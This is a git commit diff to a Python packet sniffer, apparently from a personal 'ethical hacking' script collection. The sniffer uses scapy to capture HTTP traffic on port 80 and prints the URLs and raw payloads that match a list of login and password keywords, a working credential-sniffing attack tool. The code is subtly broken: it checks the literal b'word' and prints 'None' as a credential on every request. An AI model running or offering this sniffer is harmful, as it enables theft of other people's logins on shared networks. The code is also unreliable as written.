09b4ec3ff11e04c74200794c921f36fee8b651dd
wambugu-dennis <wambugudennis398@gmail.com>
2022-09-02 17:06:41 +0300

    commit

--- Python and Ethical Hacking scripts/packet_sniffer.py
+++ Python and Ethical Hacking scripts/packet_sniffer.py
@@ -10,15 +10,27 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80")
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        words = ["Username", "user", "username",  "uname", "login", "Password", "password", "pass"]
+        for word in words:
+            if b'word' in load:
+                return load
+
+
 def sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            words = ["username", "user", "uname", "login", "password", "pass"]
-            for word in words:
-                if b'word' in load:   # converting result from byte to string for output
-                    print(load)
-                    break
+        url = str(get_url(packet))
+        print("[+] HTTP Request > " + url)
+
+        login_info = str(get_login_info(packet))
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
 
 sniff("wlo1")
